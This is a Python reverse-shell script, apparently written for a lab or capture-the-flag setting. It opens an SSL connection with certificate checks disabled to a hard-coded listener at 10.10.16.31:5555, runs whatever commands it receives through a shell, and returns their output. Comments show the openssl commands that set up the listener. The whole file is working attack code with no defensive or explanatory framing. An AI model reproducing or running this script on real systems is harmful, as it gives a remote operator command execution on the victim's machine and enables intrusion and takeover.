#!/usr/bin/env python3
# > openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
# > openssl s_server -quiet -key key.pem -cert cert.pem -4 -accept IP:PORT
# https://stackoverflow.com/questions/37174193/reverse-shell-over-ssl-in-python 
# + some fixes xD
import os
import socket
import subprocess
import ssl

# Create a socket
def socket_create():
    try:
        global host
        global port
        global ssls
        global s
        host = '10.10.16.31'
        port = 5555
        c = ssl.create_default_context()
        c.check_hostname = False
        c.verify_mode = ssl.CERT_NONE
        s = socket.socket()
        ssls = c.wrap_socket(
            s, 
            server_hostname=host
        )

    except socket.error as msg:
        print('Socket creation error: ' + str(msg))

# Connect to a remote socket
def socket_connect():
    try:
        ssls.connect((host, port))
        ssls.send(str.encode(str(os.getcwd()) + ' > '))
    except socket.error as msg:
        print('Socket connection error: ' + str(msg))

# Receive commands from remote server and run on local machine
def receive_commands():
    while True:
        data = ssls.recv(1024)
        data = data.decode("utf-8").strip()
        print('Received: ' + data)
        if data[:2] == 'cd':
            os.chdir(data[3:])
            ssls.send(str.encode(str(os.getcwd()) + ' > '))
        elif len(data) > 0:
            cmd = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            output_bytes = cmd.stdout.read() + cmd.stderr.read()
            output_str = str(output_bytes.decode("utf-8"))
            ssls.send(str.encode(output_str + str(os.getcwd()) + ' > '))
            if len(output_str.split('\n')) > 2:
                nL = 2
            else:
                nL = 0
            print('Sent: ' + nL * '\n' + output_str)
        if not data:
            break
    s.close()

def main():
    socket_create()
    socket_connect()
    receive_commands()

if __name__ == '__main__':
    main()

